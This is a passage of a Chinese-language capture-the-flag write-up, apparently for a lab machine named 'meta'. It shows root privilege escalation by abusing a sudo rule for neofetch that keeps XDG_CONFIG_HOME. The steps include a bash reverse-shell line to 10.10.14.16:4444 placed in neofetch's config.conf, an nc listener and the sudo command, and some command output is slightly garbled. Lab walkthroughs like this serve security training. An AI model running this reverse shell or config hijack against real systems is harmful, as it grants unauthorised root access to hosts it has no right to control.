### Root

```

-bash-5.0$ sudo -lfor
 thomas on meta:local/sbin\:/usr/local

/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME
```

sudo -l看到有一个可以root权限执行的neofetch

> https://gtfobins.github.io/gtfobins/neofetch/

这里找到一个提权相关的

但是有一点不一样，这里的权限只能使用指定参数

但是会保留XDG\_CONFIG\_HOME的环境变量

然后当前用户的neofetch配置文件可控

现在按照这个思路来操作吧

```
-bash-5.0$ cd

 ~/.config/neofetch/
```

1.  在config.conf的第一行添加一个反向shell

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1"

```

1.  将thomas.config导出到基本配置环境路径

```
export XDG_CONFIG_HOME="$HOME/.config"

```

1.  在本地启用nc监听一个端口

```

nc -nvlp 4444
```

1.  以root权限执行neofetch文件

```

sudo -u root /usr/bin/neofetch \"\"
```

```

┌──(root💀kali)-[~/Desktop]# nc -nvlp 4444

# whoami&&id


```

成功获得root权限

```
root@meta:/home/thomas/.config/neofetch# cd /root
cd
 /root# ls


```

成功拿到root权限的flag文件
